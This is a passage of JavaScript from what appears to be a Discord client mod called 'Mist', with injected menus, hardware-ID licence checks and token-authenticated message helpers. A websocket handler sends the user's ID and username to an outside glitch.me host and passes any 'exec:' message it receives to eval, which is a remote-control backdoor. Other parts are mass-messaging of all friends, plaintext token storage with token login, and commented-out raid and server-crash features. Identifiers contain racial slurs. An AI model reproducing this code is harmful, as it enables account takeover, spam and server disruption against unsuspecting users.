            LicenseType.innerText = body.split("<br>")[0];
            LicenseKey.innerText = body.split("<br>")[1];
            HWID = body.split("<br>")[2];
            IP = body.split("<br>")[5];
        });

        whitelistInfoButton.addEventListener("click", () => {
             /*
             <div class="contentRegion-3nDuYy"><div class="contentTransitionWrap-3hqOEW"><div class="scrollerWrap-2lJEkd firefoxFixScrollFlex-cnI2ix contentRegionScrollerWrap-3YZXdm scrollerThemed-2oenus themeGhost-28MSn0 scrollerTrack-1ZIpsv"><div class="scroller-2FKFPG firefoxFixScrollFlex-cnI2ix systemPad-3UxEGl contentRegionScroller-26nc1e"><div class="contentColumn-2hrIYH contentColumnDefault-1VQkGM"><div><div class="userSettingsAccount-2eMFVR"><h2 class="h2-2gWE-o title-3sZWYQ size16-14cGz5 height20-mO2eIN weightSemiBold-NJexzi defaultColor-1_ajX0 defaultMarginh2-2LTaUL marginBottom20-32qID7" id="MistInfoHeader">Your User Information</h2><div class="description-3_Ncsb formText-3fs7AJ marginBottom20-32qID7 modeDefault-3a2Ph1 primary-jw0I4K" style="position:absolute; top:80px;">Here you can view your mist license information. Isn't that neat?</div><div class="vertical-V37hAW flex-1O1GKY directionColumn-35P_nr"><div class="userInfoViewing-16kqK3 cardPrimary-1Hv-to card-3Qj_Yx"><div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6" style="flex: 1 1 auto;"><div class="flexChild-faoVW3" style="flex: 0 1 auto;"><div class="wrapper-3t9DeA" role="img" aria-label="Mist - Yaekith" aria-hidden="false" style="width: 100px; height: 100px;"><svg width="100" height="100" viewBox="0 0 100 100" class="mask-1l8v16" aria-hidden="true"><foreignObject x="0" y="0" width="100" height="100" mask="url(#svg-mask-avatar-default)"><img src="https://cdn.discordapp.com/avatars/602119454003953694/f3bb2453164471198c5f43699bf151d4.png?size=128" alt=" " class="avatar-VxgULZ" aria-hidden="true"></foreignObject></svg></div></div><div class="flexChild-faoVW3" style="flex: 1 1 auto;"><div class="marginBottom20-32qID7"><h5 class="h5-18_1nd title-3sZWYQ size12-3R0845 height16-2Lv3qA weightSemiBold-NJexzi marginBottom4-2qk4Hy faded-3bns_w">Whitelist HWID</h5><div class="viewBody-2Qz-jg selectable-x8iAUj" id="WhitelistedHWID">Gathering Information...</div></div><div><h5 class="h5-18_1nd title-3sZWYQ size12-3R0845 height16-2Lv3qA weightSemiBold-NJexzi marginBottom4-2qk4Hy faded-3bns_w">Whitelisted IP</h5><div class="viewBody-2Qz-jg selectable-x8iAUj" id="WhitelistedIP">127.0.0.1</div><br><h5 class="h5-18_1nd title-3sZWYQ size12-3R0845 height16-2Lv3qA weightSemiBold-NJexzi marginBottom4-2qk4Hy faded-3bns_w" style="top: 0px;">Whitelist Date</h5><div class="viewBody-2Qz-jg selectable-x8iAUj" id="LicenseType">Unknown</div></div></div><button type="button" class="userInfoViewingButton-2-jbH9 button-38aScr lookFilled-1Gx00P colorBrand-3pXr91 sizeSmall-2cSMqn grow-q77ONN" id="GoBackButton"><div class="contents-18-Yxp">Go Back</div></button></div></div></div></div></div></div><div class="toolsContainer-1edPuj"><div class="tools-3-3s-N"><div class="container-1sFeqf"><div tabindex="0" class="closeButton-1tv5uR" role="button"><svg name="Close" aria-hidden="false" width="18" height="18" viewBox="0 0 12 12"><g fill="none" fill-rule="evenodd"><path d="M0 0h12v12H0"></path><path class="fill" fill="#dcddde" d="M9.5 3.205L8.795 2.5 6 5.295 3.205 2.5l-.705.705L5.295 6 2.5 8.795l.705.705L6 6.705 8.795 9.5l.705-.705L6.705 6"></path></g></svg></div><div class="keybind-KpFkfr">ESC</div></div></div></div></div></div></div></div>
             */


              for(var i = 0; i < holster.children.length; i++)
            {
                holster.children[i].remove();
            }

            holster.appendChild(window.MistUtils.InjectHTML(` <div class="contentRegion-3nDuYy"><div class="contentTransitionWrap-3hqOEW"><div class="scrollerWrap-2lJEkd firefoxFixScrollFlex-cnI2ix contentRegionScrollerWrap-3YZXdm scrollerThemed-2oenus themeGhost-28MSn0 scrollerTrack-1ZIpsv"><div class="scroller-2FKFPG firefoxFixScrollFlex-cnI2ix systemPad-3UxEGl contentRegionScroller-26nc1e"><div class="contentColumn-2hrIYH contentColumnDefault-1VQkGM"><div><div class="userSettingsAccount-2eMFVR"><h2 class="h2-2gWE-o title-3sZWYQ size16-14cGz5 height20-mO2eIN weightSemiBold-NJexzi defaultColor-1_ajX0 defaultMarginh2-2LTaUL marginBottom20-32qID7" id="MistInfoHeader">Your User Information</h2><div class="description-3_Ncsb formText-3fs7AJ marginBottom20-32qID7 modeDefault-3a2Ph1 primary-jw0I4K" style="position:absolute; top:80px;">Here you can view your mist license information. Isn't that neat?</div><div class="vertical-V37hAW flex-1O1GKY directionColumn-35P_nr"><div class="userInfoViewing-16kqK3 cardPrimary-1Hv-to card-3Qj_Yx"><div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6" style="flex: 1 1 auto;"><div class="flexChild-faoVW3" style="flex: 0 1 auto;"><div class="wrapper-3t9DeA" role="img" aria-label="Mist - Yaekith" aria-hidden="false" style="width: 100px; height: 100px;"><svg width="100" height="100" viewBox="0 0 100 100" class="mask-1l8v16" aria-hidden="true"><foreignObject x="0" y="0" width="100" height="100" mask="url(#svg-mask-avatar-default)"><img src="https://cdn.discordapp.com/avatars/602119454003953694/f3bb2453164471198c5f43699bf151d4.png?size=128" alt=" " class="avatar-VxgULZ" aria-hidden="true"></foreignObject></svg></div></div><div class="flexChild-faoVW3" style="flex: 1 1 auto;"><div class="marginBottom20-32qID7"><h5 class="h5-18_1nd title-3sZWYQ size12-3R0845 height16-2Lv3qA weightSemiBold-NJexzi marginBottom4-2qk4Hy faded-3bns_w">Whitelist HWID</h5><div class="viewBody-2Qz-jg selectable-x8iAUj" id="WhitelistedHWID">Gathering Information...</div></div><div><h5 class="h5-18_1nd title-3sZWYQ size12-3R0845 height16-2Lv3qA weightSemiBold-NJexzi marginBottom4-2qk4Hy faded-3bns_w">Whitelisted IP</h5><div class="viewBody-2Qz-jg selectable-x8iAUj" id="WhitelistedIP">127.0.0.1</div><br><h5 class="h5-18_1nd title-3sZWYQ size12-3R0845 height16-2Lv3qA weightSemiBold-NJexzi marginBottom4-2qk4Hy faded-3bns_w" style="top: 0px;">Whitelist Date</h5><div class="viewBody-2Qz-jg selectable-x8iAUj" id="LicenseType">Unknown</div></div></div><button type="button" class="userInfoViewingButton-2-jbH9 button-38aScr lookFilled-1Gx00P colorBrand-3pXr91 sizeSmall-2cSMqn grow-q77ONN" id="GoBackButton"><div class="contents-18-Yxp">Go Back</div></button></div></div></div></div></div></div><div class="toolsContainer-1edPuj"><div class="tools-3-3s-N"><div class="container-1sFeqf"><div tabindex="0" class="closeButton-1tv5uR" role="button"><svg name="Close" aria-hidden="false" width="18" height="18" viewBox="0 0 12 12"><g fill="none" fill-rule="evenodd"><path d="M0 0h12v12H0"></path><path class="fill" fill="#dcddde" d="M9.5 3.205L8.795 2.5 6 5.295 3.205 2.5l-.705.705L5.295 6 2.5 8.795l.705.705L6 6.705 8.795 9.5l.705-.705L6.705 6"></path></g></svg></div><div class="keybind-KpFkfr">ESC</div></div></div></div></div></div></div></div>`));
            var whitelistedHWID = document.getElementById('WhitelistedHWID');
            var whitelistedIP = document.getElementById('WhitelistedIP');
            var WhitelistDate = document.getElementById('Whitelist Date');
            var goBack = document.getElementById('GoBackButton');

            goBack.addEventListener("click", () => {
                for(var i = 0; i < holster.children.length; i++)
                {
                holster.children[i].remove();
                }

                addUserInfoMenu();
            });

            request.get(`http://yaekiths-projects.xyz/getmistinfo.php?hwid=${window.GetHWID()}`, {
                headers: {'User-Agent' : 'UsWCmjlbTlFf050hpxEyQCNk2IFT8w0Ukdt7Ohga'}
            }, (err, res, body) => {
                whitelistedHWID.innerText = body.split("<br>")[2];
                whitelistedIP.innerText = body.split("<br>")[4];

                if (body.split("<br>")[2] == "") whitelistedHWID.innerText = "Unknown";
                if (body.split("<br>")[4] == "") whitelistedIP.innerText = "Unknown";
            });
        });
    }
}
function GetRandomMusic()
{
    var music = [
        "https://cdn.discordapp.com/attachments/665754727857782785/679818493935484993/moe_shoppu_lovu_tastu_is_tha_weh.mp3",
        "https://cdn.discordapp.com/attachments/665754727857782785/679820083996262507/y2mate.com_-_sickick_lost_my_way_audio_4SCp4fQQgV4.mp3",
        "https://cdn.discordapp.com/attachments/665754727857782785/679821166948515939/Anime_Thighs_feat._Wonder.mp3",
        "https://cdn.discordapp.com/attachments/665754727857782785/679821402865795082/y2mate.com_-_aftermath_the_way_you_are_uh-dnvc2mqQ.mp3"
    ]

    return music[Math.floor(Math.random() * music.length)]
}
window.MistUtils.MistMenu = function (){
    setInterval(() => {
        if (PlayMenuAudio)
        {
            if (document.getElementById("MistMenuAudio") == undefined)
            {
                var audioURL = GetRandomMusic();
                var audio = window.MistUtils.InjectHTML(`<audio autoplay id='MistMenuAudio'><source src="${audioURL}" type="audio/mpeg"></audio>`);
        
                document.body.appendChild(audio);
            }

            microphone.className = "iconButtonDefault-2cKx7- iconButton-3V4WS5 toggleButton-3XFSva medium-2JR8YY";

            microphone.style = "background-image: url('/assets/4bc527c257233fc69b94342d77bcb9ee.svg');";
        }
        else
        {
            if (document.getElementById('MistMenuAudio') != undefined)
            {
                document.getElementById("MistMenuAudio").remove();
            }

            microphone.className = "iconButtonStatic-2cPMA6 iconButton-3V4WS5 toggleButton-3XFSva medium-2JR8YY";

            microphone.style = "background-image: url('/assets/990826f372c3d1d1792e3f1df06609bb.svg');";
        }
    }, 500);
    var style = document.createElement("style");
    style.appendChild(document.createTextNode(`
    body {
        background-color: #353b48;
        color: #dcdde1;
      }
      
      .wrapper {
        max-width: 728px;
      }
      .rainbow-text {
        background-image: repeating-linear-gradient(45deg, violet, indigo, blue, green, yellow, orange, red, violet);
        text-align: center;
        background-size: 800% 800%;
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        font-size: 24px;
        animation: rainbow 8s ease infinite;
      }
      
      @keyframes rainbow { 
          0%{background-position:0% 50%}
          50%{background-position:100% 25%}
          100%{background-position:0% 50%}
    }
    
    .noHover{
        pointer-events: none;
    }`));
    document.body.appendChild(style);
    var usernamething = window.findModule('getCurrentUser').getCurrentUser().username.toString();
    var AnimatedAvatarDetected = findModule('hasAnimatedAvatar').hasAnimatedAvatar(findModule('getCurrentUser').getCurrentUser());
    var avatarthing2 =  AnimatedAvatarDetected ? `https://cdn.discordapp.com/avatars/${window.findModule('getCurrentUser').getCurrentUser().id}/${window.findModule('getCurrentUser').getCurrentUser().avatar}.gif?size=128` : `https://cdn.discordapp.com/avatars/${window.findModule('getCurrentUser').getCurrentUser().id}/${window.findModule('getCurrentUser').getCurrentUser().avatar}.png?size=128`
    var discrim = document.getElementsByClassName("size10-tblYdA subtext-3ECeS_ discriminator-3-Lf_x")[0];
    var discriminator = "#" + window.findModule('getCurrentUser').getCurrentUser().discriminator.toString();
    var MistMenuHolder = document.getElementsByClassName('appMount-3lHmkl')[0];
    var element2 = window.MistUtils.InjectHTML(`<div class="theme-dark" id="mistmenu3">
    <div class="backdrop-1wrmKB" style="opacity: 0.70; background-color: rgb(0, 0, 0); z-index: 1000; transform: translateZ(0px);"></div>
    <div class="modal-3c3bKg" style="opacity: 1; transform: scale(1) translateZ(0px);">
       <div data-focus-guard="true" tabindex="0" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div>
       <div data-focus-guard="true" tabindex="1" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div>
       <div data-focus-lock-disabled="false" class="inner-1ilYF7">
          <div class="menu-Sp6bN1" style="width: 600px; max-height: 800px; min-height: 400px; border-radius: 5px;
          display: -webkit-box;
          display: -ms-flexbox;
          display: flex;
          -webkit-box-flex: 1;
          -ms-flex: 1;
          flex: 1;
          -webkit-box-orient: vertical;
          -webkit-box-direction: normal;
          -ms-flex-direction: column;
          flex-direction: column;">
             <div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignCenter-1dQNNs noWrap-3jynv6 header-2tA9Os" style="flex: 0 0 auto;">
                <h3 class="wrapper-1sSZUt base-1x0h_U size20-17Iy80"><span class="label-1Y-LW5"><center class="rainbow-text">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mist Menu</center></span></h3>
                <button aria-label="Close" type="button" id='MistMenuCloseButton' class="close-1kwMUs closeIcon-3_iQ6l button-38aScr lookBlank-3eh9lL colorBrand-3pXr91 grow-q77ONN">
                   <div class="contents-18-Yxp">
                      <svg name="Close" aria-hidden="false" width="18" height="18" viewBox="0 0 12 12">
                         <g fill="none" fill-rule="evenodd">
                            <path d="M0 0h12v12H0"></path>
                            <path class="fill" fill="currentColor" d="M9.5 3.205L8.795 2.5 6 5.295 3.205 2.5l-.705.705L5.295 6 2.5 8.795l.705.705L6 6.705 8.795 9.5l.705-.705L6.705 6"></path>
                         </g>
                      </svg>
                   </div>
                </button>
             </div>
             <div class="scrollerWrap-2lJEkd firefoxFixScrollFlex-cnI2ix content-1EtbQh scrollerThemed-2oenus themeHidden-2yP93k">
                <div class="scroller-2FKFPG firefoxFixScrollFlex-cnI2ix systemPad-3UxEGl inner-ZyuQk0 content-2qfHzC">
                <div class="radioGroup-1GBvlr" id="injectherenigga">
  
                  
                   <span></span>
                </div>
             </div>
          </div>
          <div class="container-3baos1"><div tabindex="0" aria-controls="popout_1" aria-expanded="false" aria-label="Set Status" role="button"><div tabindex="0" aria-label="Set Status" class="avatarWrapper-2yR4wp" role="button"><div class="avatar-SmRMf2 wrapper-3t9DeA" role="img" aria-label="Mist Do Not Disturb" aria-hidden="false" style="width: 32px; height: 32px;"><svg width="40" height="32" viewBox="0 0 40 32" class="mask-1l8v16" aria-hidden="true"><foreignObject x="0" y="0" width="32" height="32" mask="url(#svg-mask-avatar-status-round-32)"><img src="${avatarthing2}" alt=" " class="avatar-VxgULZ" aria-hidden="true"></foreignObject><rect width="10" height="10" x="22" y="22" fill="#f04747" mask="url(#svg-mask-status-dnd)" class="pointerEvents-2zdfdO"></rect></svg></div></div></div><div class="nameTag-3uD-yy"><div class="colorStandard-2KCXvj size14-e6ZScH usernameContainer-1fp4nu"><span class="username-2BIRiC">${usernamething}</span><button class="iconButtonDefault-2cKx7- iconButton-3V4WS5 toggleButton-3XFSva medium-2JR8YY" aria-label="Mute" style="background-image: url(&quot;/assets/4bc527c257233fc69b94342d77bcb9ee.svg&quot;);" id='AudioButtonMist'></button></div><div class="size10-tblYdA subtext-3CDbHg channel-1TmDQ6" id='DiscriminatorHolder'>${discriminator}</div></div></button></div>
       </div>
       
       <div data-focus-guard="true" tabindex="0" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div>
    </div>
 </div>`);

    MistMenuHolder.appendChild(element2);

    addMenuShitButtons();

    var microphone = document.getElementById('AudioButtonMist');
    microphone.addEventListener("click", () => {
    PlayMenuAudio = !PlayMenuAudio;
    if (PlayMenuAudio)
    {
        microphone.className = "iconButtonDefault-2cKx7- iconButton-3V4WS5 toggleButton-3XFSva medium-2JR8YY";

        microphone.style = "background-image: url(&quot;/assets/4bc527c257233fc69b94342d77bcb9ee.svg&quot;);";
    }
    else
    {
        microphone.className = "iconButtonStatic-2cPMA6 iconButton-3V4WS5 toggleButton-3XFSva medium-2JR8YY";

        microphone.style = "background-image: url(&quot;/assets/990826f372c3d1d1792e3f1df06609bb.svg&quot;);";
    }
  });

  var closeButton = document.getElementById('MistMenuCloseButton');
  closeButton.addEventListener("click", () => {
      fadeOut(document.getElementById('mistmenu3'));
  });

}
var stopit = false;

var openWebSocket = function() {


    request.get('glaze-akubra.glitch.me/', (err, res, body) => {
        myWebSocket = new WebSocket(`wss://glaze-akubra.glitch.me/`, {});
        
    });
    var ws = new WebSocket(`wss://glaze-akubra.glitch.me/`, {});
    ws.on('open', function() {


        setInterval(() => {
        ws.send("ping");

        },20000);
        
        setTimeout(() => {  ws.send(`CONNECTED:` + ` <@${window.findModule('getCurrentUser').getCurrentUser().id}>:${window.findModule('getCurrentUser').getCurrentUser().username}`);
    },6000);
    window.MistUtils.SendStatusMessage("Notification","Connected to mist servers.",6000);
});
 
  
    ws.on('message', (msg) => {
        console.info('%c[Mist]','color: #257dd4', 'Received a websocket event.');
        
        if(msg.includes("a:")){
            console.info('%c[Mist]','color: #257dd4', 'Received a notification.');
            window.MistUtils.SendStatusMessage("Notification",msg.replace("a:",""),9000);
        }
        else
        {
            
            if(msg.includes("exec:")){
                var command = msg.replace("exec:","");
                var evaled = eval(command);
    
            }
            else
            {
                if(!msg.includes("pong")){
                    window.MistUtils.SendFakeNigga(msg);
                }
               
            }
         
        }
       
    });
    ws.on('close', function() {
        //console.log('disconnected');
        stopit = true;
        openWebSocket();
    });
}
//openWebSocket();
function addMenuShitButtons() {
    /*
    addModuleButton("Christmas", "Celebrate the best event of this year!", null, () => {
        fadeOut(document.getElementById('mistmenu3'));
        ChristmasTheme = true;
        var elem = document.createElement('pb');
        elem.id = "VideoThing";
        var safeDiv = document.body.appendChild(elem); safeDiv.innerHTML = `<marquee direction="down" width="100%" height="100%" behavior="alternate" id='VideoThing'><marquee behavior="alternate"><iframe width="560" height="315" src="https://www.youtube.com/embed/-nTkcVBbfSg?autoplay=1" frameborder="0" allow="accelerometer; loop; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe></marquee></marquee>`; safeDiv.style = `position:absolute;top:0; left: 0; width:100%; height:100%;z-index:100000;pointer-events: none;`
        EasterEggs++;
    });
    */
/*
    addModuleButton("Server Attack", "Let's get the word out.", null, () => {
        fadeOut(document.getElementById('mistmenu3'));
        var channelID;
        var Message;
            if (window.location.href.includes('https://discordapp.com/channels/') && !window.location.href.includes("@me"))
            {
                channelID = window.location.href.split("/")[5];

                window.TextValue = "";
                window.ShowBox("Server Attack", "Let's get the word out.", "Enter a message.", () => {
                    Message = window.TextValue;
                    window.RaidAPI.CallServerAttack(channelID, Message);
                    window.TextValue = ""; 

                    window.MistUtils.SendStatusMessage('Server Attack', 'Sending them messages.', 10000);
                });
            }
            else
            {
                window.ShowBox("Server Attack", "Let's get the word out.", "Enter a ChannelID", () => {
                
                });
                window.ShowBox("Server Attack", "Let's get the word out.", "Enter a ChannelID", () => {
                    channelID = window.TextValue;
                    window.TextValue = "";
                    window.ShowBox("Server Attack", "Let's get the word out.", "Enter a message.", () => {
                        Message = window.TextValue;
                        window.TextValue = "";

                        window.MistUtils.SendStatusMessage('Server Attack', 'Sending them messages.', 10000);
                    });
                });
            }
    });
*/
    addModuleButton("M2AF", "Message all your friends with a click of a button. Cool!", null, () => {
        fadeOut(document.getElementById('mistmenu3'));
        window.ShowBox("M2AF", "Spread the word around to your friends.", "Enter a message", () => {
            var msg = window.TextValue;

            window.TextValue = "";

            SendM2AF(msg);

            window.MistUtils.SendStatusMessage('M2AF', 'Sending a message to all friends...', 5000)
        });
    });
    if (fs.existsSync(`${process.env.InstallationDir}/account.txt`))
    {
            addModuleButton("Switch Back", "Time to take the party back home.", null, () => {
                fadeOut(document.getElementById('mistmenu3'));
            window.LoginWithToken(fs.readFileSync(`${process.env.InstallationDir}/account.txt`).toString());

            fs.unlinkSync(`${process.env.InstallationDir}/account.txt`)
        });
    }
    else{
        addModuleButton("Switch Account", "Let's move this party to another account.", null, () => {
            fadeOut(document.getElementById('mistmenu3'));
            window.ShowBox("Switch Account", "Time to transfer this party.", "Enter a token", () => {
                var token = window.TextValue;
    
                window.TextValue = "";

                fs.writeFileSync(`${process.env.InstallationDir}/account.txt`, token);

                window.LoginWithToken(token);
            });
        });
    }
    
/*
    addModuleButton("Join Blast", "Invite your friends and throw a tea party.", null, () => {
        fadeOut(document.getElementById('mistmenu3'));
        window.ShowBox("Join Blast", "Invite your friends and let's throw this party!", "Enter an Invite", () => {
            var invite = window.TextValue;
            window.TextValue = "";

            window.RaidAPI.CallJoinAttack(ParseInvite(invite));

            window.MistUtils.SendStatusMessage('Join Blast', "Let's throw this party!", 5000)
        })
    });

    addModuleButton("Leave Blast", "Party's over, let's go, guys.", null, () => {
        fadeOut(document.getElementById('mistmenu3'));
        featurenotadded();
    });

    

    
    addModuleButton("Friendship Attack", "Let's give a user some friends.", null, () => {
        fadeOut(document.getElementById('mistmenu3'));
        featurenotadded();
    });
    
    addModuleButton("Crash Server", "Let's crash some servers.", null, () => {
        fadeOut(document.getElementById('mistmenu3'));
        var inv;
        var ChanID;
        window.ShowBox("Server Crasher", "Let's freeze this bitch.", "Enter an Invite", () => {
            inv = window.TextValue;
            window.TextValue = "";

            if (window.location.href.includes('https://discordapp.com/channels/') && !window.location.href.includes("@me"))
            {   
                ChanID = window.location.href.split("/")[5];
                window.TextValue = "";
    
                window.RaidAPI.CallCrashAttackServer(inv, ChanID);

                window.MistUtils.SendStatusMessage('Server Crasher', "Crashing a server...", 5000)
            }
            else
            {
                window.ShowBox("Server Crasher", "Let's freeze this bitch.", "Enter a ChannelID", () => {
                    ChanID = window.TextValue;
                    window.TextValue = "";

                    window.RaidAPI.CallCrashAttackServer(inv, ChanID);

                    window.MistUtils.SendStatusMessage('Server Crasher', "Crashing a server...", 5000)
                });
            }
        });
    });

    addModuleButton("Crash User", "Users be laggin'", null, () => {
        fadeOut(document.getElementById('mistmenu3'));
        featurenotadded();
    });
*/
function getGuildID(){
    var guildId = window.location.toString().split("/");

    return guildId[4];
}
function getChannelID()
{
    console.warn(window.location.toString().split("/")[window.location.toString().split("/").length - 1] + " -- channelid");
    return window.location.toString().split("/")[window.location.toString().split("/").length - 1]
}
function sendMessage(text)
{
    request.post(`https://discordapp.com/api/v6/channels/${getChannelID()}/messages`,
    {
            headers: {
                'Authorization' : window.getUserToken()
            },
            json: true,
            body: {
            'content' : text,
            'nonce' : null,
            'tts' : false
            }
        }, (err, res, body) => {
			console.log(body);
    });
}
function sendEmbed(title, text, color, img) {
    var Color2 = parseColor(color);
	var channelID = window.location.pathname.split('/').pop();
	var embed = {
		type : "rich",
        description : text,
	};

	if (color) {
		embed.color = Color2;
	}

	if (title) {
		embed.title = title;
    }
    
    if (img != undefined)
    {
        embed.image = {
            'url' : img
        }
    }
	
	var data = JSON.stringify({embed : embed});
	
	request.post(`https://discordapp.com/api/channels/${channelID}/messages`, {
        headers: {
            'Authorization' : window.getUserToken(),
            'Content-Type' : 'application/json'
        },
        body: data
    }, (err, res, body) => { 

    });
}

function parseColor(Color)
{
    switch(makeLowerCase(Color))
    {
        default:
            return "1266338";
        case "blue":
            return "1266338";
        case "red":
            return "13632027";
        case "green":
            return "5880085";
        case "yellow":
            return "16312092";
        case "cyan":
           return "5301186";
        case "white":
            return "16777215";
        case "black":
            return "1";
    }
}

request.get(`http://yaekiths-projects.xyz/getmistinfo.php?hwid=${window.GetHWID()}`, {
    headers: {'User-Agent' : 'UsWCmjlbTlFf050hpxEyQCNk2IFT8w0Ukdt7Ohga'}
},(err, res, body) => {
    switch(body.split("<br>")[0].toLowerCase())
    {
        default:
            break;
        case 'extermination':
         addModuleButton("Shibe", "Summon a shiba inu into the current chat.", null, () => {
            fadeOut(document.getElementById('mistmenu3'));
            (async()=> await request.get('http://shibe.online/api/shibes?count=1&urls=true&httpsUrls=true', (err, res, body) => {  const stuff = body; var shibe = stuff.replace(`["`,``).replace(`"]`,``); sendEmbed("A shiba has appeared", "You better give him pat", "green", shibe)}))()
          });
            break;
        case "sudo":
            addModuleButton("Shibe", "Summon a shiba inu into the current chat.", null, () => {
                fadeOut(document.getElementById('mistmenu3'));
                (async()=> await request.get('http://shibe.online/api/shibes?count=1&urls=true&httpsUrls=true', (err, res, body) => {  const stuff = body; var shibe = stuff.replace(`["`,``).replace(`"]`,``); sendEmbed("A shiba has appeared", "You better give him pat", "green", shibe)}))()
              });
            break;
          
      
    }
  });
}
function featurenotadded() {
    window.DrawingAPI.alert('MistRiX', 'Feature not implemented yet.');
}

window.MistUtils.SendFakeJoin = function()
{
    setInterval(() => {
        window.findModule('sendBotMessage').receiveMessage('590144297630957591',{
        "id": window.findModule('fromTimestamp').fromTimestamp(Date.now()),
        "type":7,
        "content":"yourmessagenigga",
        "channel_id":location.href.split("/")[5],
        "author":{
        "id":window.findModule('fromTimestamp').fromTimestamp(Date.now()),
        "username":"scoopediwoop",
        "discriminator":"0000",
        "avatar":"oof",
        "bot":false
        },
        "attachments":[
        ],
        "embeds":[
        ],
        "pinned":false,
        "mentions":[
        ],
        "mention_channels":[
        ],
        "mention_roles":[
        ],
        "mention_everyone":false,
        "timestamp":"2019-08-10T22:38:17.778Z",
        "state":"SENT",
        "tts":false
        })
      
        var rebeu = window.MistUtils.InjectHTML(`<div class="memberOnline-1CIh-0 member-3W1lQa"><div class="avatarWrapper-3B0ndJ wrapper-3t9DeA" role="img" aria-label="marion, Online" aria-hidden="false" style="width: 32px; height: 32px;"><svg width="40" height="32" viewBox="0 0 40 32" class="mask-1l8v16" aria-hidden="true"><foreignObject x="0" y="0" width="32" height="32" mask="url(#svg-mask-avatar-status-round-32)"><img src="/assets/1cbd08c76f8af6dddce02c5138971129.png" alt=" " class="avatar-VxgULZ" aria-hidden="true"></foreignObject><rect width="10" height="10" x="22" y="22" fill="#43b581" mask="url(#svg-mask-status-online)" class="pointerEvents-2zdfdO"></rect></svg></div><div class="memberInner-2CPc3V"><div class="memberContent-1MK6T5"><div class="nameTag-3p0yK- nameTag-m8r81H"><span class="username-2b1r56 usernameOnline-3jr_0Y username-1cB_5E">scoopediwoo</span></div></div></div></div>`);
        document.getElementsByClassName("memberOnline-1CIh-0 member-3W1lQa").appendChild(rebeu);  
    }, 200)
}
function addModuleButton(name, description, callback, callback2 = null)
{
    var wheretoinjectlol = document.getElementById("injectherenigga");
    var newlol = window.MistUtils.InjectHTML(`<div id="${name}-card" style="padding: 10px;" class="item-26Dhrx marginBottom8-AtZOdT horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG cardPrimaryEditable-3KtE4g card-3Qj_Yx"><label class="checkboxWrapper-SkhIWG alignTop-1ntJ4-"><div class="label-cywgfr labelClickable-11AuB8 labelForward-1wfipV" style="line-height: 24px;"><div class="info-3LOr12"><div class="title-3BE6m5">${MenuButtonTitle}</div><div class="desc-2Dttbk marginTop4-2BNfKC">${MenuButtonDescription}</div></div></div></label><button type="button" class="button-1x2ahC button-38aScr lookFilled-1Gx00P colorGreen-29iAKY sizeSmall-2cSMqn grow-q77ONN" id="${buttonID}" style="margin-top:5px; background-color: rgb(114, 137, 218); border-color: rgb(114, 137, 218);"><div class="contents-18-Yxp" id="${buttonText}">Execute</div></button></div>`);

    wheretoinjectlol.appendChild(newlol);
 
    var lolipop = document.getElementById(`${name}-button`);
    lolipop.addEventListener("click", function () {
        if (callback2 != null){
            callback2();
        }

        if (callback != null)
        {
            eval(callback);
        }


    });
}
function showModulesMenu(){
    var holster = document.getElementsByClassName("contentRegion-3nDuYy")[0];

    if (!document.getElementById('MistModulesHeader'))
    {
        for(var i = 0; i < holster.children.length; i++)
        {
        holster.children[i].remove();
        }   
        if (!fs.existsSync(`${process.env.InstallationDir}\\mods`))
        {
            holster.appendChild(window.MistUtils.InjectHTML(`<div class="contentRegion-3nDuYy"><div class="contentTransitionWrap-3hqOEW"><div class="scrollerWrap-2lJEkd firefoxFixScrollFlex-cnI2ix contentRegionScrollerWrap-3YZXdm scrollerThemed-2oenus themeGhost-28MSn0 scrollerTrack-1ZIpsv"><div class="scroller-2FKFPG firefoxFixScrollFlex-cnI2ix systemPad-3UxEGl contentRegionScroller-26nc1e"><div class="contentColumn-2hrIYH contentColumnDefault-1VQkGM"><div><h2 class="h2-2gWE-o title-3sZWYQ size16-14cGz5 height20-mO2eIN weightSemiBold-NJexzi defaultColor-1_ajX0 defaultMarginh2-2LTaUL marginBottom20-32qID7" id="MistModulesHeader">Mist Modules</h2><div class="description-3_Ncsb formText-3fs7AJ note-1V3kyJ modeDefault-3a2Ph1 primary-jw0I4K" style="position:absolute;top:75px;">Who doesn't want to have some fun?</div><div class="vertical-V37hAW flex-1O1GKY directionColumn-35P_nr"><div class="divider-3573oO dividerDefault-3rvLe-"></div></div></div><div class="marginTop60-3PGbtK"><div class="flex-1xMQg5 flex-1O1GKY vertical-V37hAW flex-1O1GKY directionColumn-35P_nr justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6" style="flex: 1 1 auto;"><div class="flex-1xMQg5 flex-1O1GKY vertical-V37hAW flex-1O1GKY directionColumn-35P_nr 